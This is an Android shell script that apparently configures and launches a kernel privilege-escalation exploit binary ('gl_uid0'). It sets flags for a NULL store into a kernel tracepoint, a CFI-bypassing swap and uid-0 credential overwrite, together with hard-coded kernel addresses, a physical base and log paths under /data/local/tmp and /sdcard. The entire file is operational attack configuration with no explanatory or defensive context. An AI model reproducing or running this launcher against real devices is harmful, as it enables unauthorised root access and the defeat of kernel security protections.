#!/system/bin/sh
# W1: leaf-NULL *__tracepoint_sys_exit.funcs=0 (not T1 tree_pc=0)
# W2: same-process self-cred. Skip park.
export MODE4_ONLY=1
export MODE4_SLIDE_ZERO=1
export MODE4_NULL_STORE=1
export MODE4_SWAP_NOCFI=1
export MODE4_UID0=1
export SLIDE_P0_TARGET=0xffffff802a950700
export DATAONLY_TARGET=0x2950700
export KPHYS=0xa8000000
export CORE_SEL=7
export GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
export GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt
export GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log
cd /data/local/tmp
echo START $(date) >> /data/local/tmp/hookcred_console.txt
exec /data/local/tmp/gl_uid0 >> /data/local/tmp/hookcred_console.txt 2>&1
